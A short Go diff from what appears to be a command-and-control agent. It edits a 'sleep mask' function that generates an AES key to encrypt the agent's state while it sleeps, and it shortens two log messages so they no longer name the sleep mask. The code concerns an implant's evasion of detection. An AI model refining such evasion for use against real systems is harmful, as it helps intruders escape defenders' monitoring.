@@ -102,7 +102,7 @@ func obfuscateSleep(agent *structs.Agent, c2 profiles.Profile) *sleepVault {
 	// Generate random AES-256 key for this sleep cycle
 	vault.key = make([]byte, 32)
 	if _, err := rand.Read(vault.key); err != nil {
-		log.Printf("[WARNING] Sleep mask: key generation failed: %v", err)
+		log.Printf("mask key error: %v", err)
 		return nil
 	}
 
@@ -123,7 +123,7 @@ func obfuscateSleep(agent *structs.Agent, c2 profiles.Profile) *sleepVault {
 	}
 	plaintext, err := json.Marshal(ad)
 	if err != nil {
-		log.Printf("[WARNING] Sleep mask: agent marshal failed: %v", err)
+		log.Printf("mask marshal error: %v", err)
 		zeroBytes(vault.key)
 		return nil
 	}
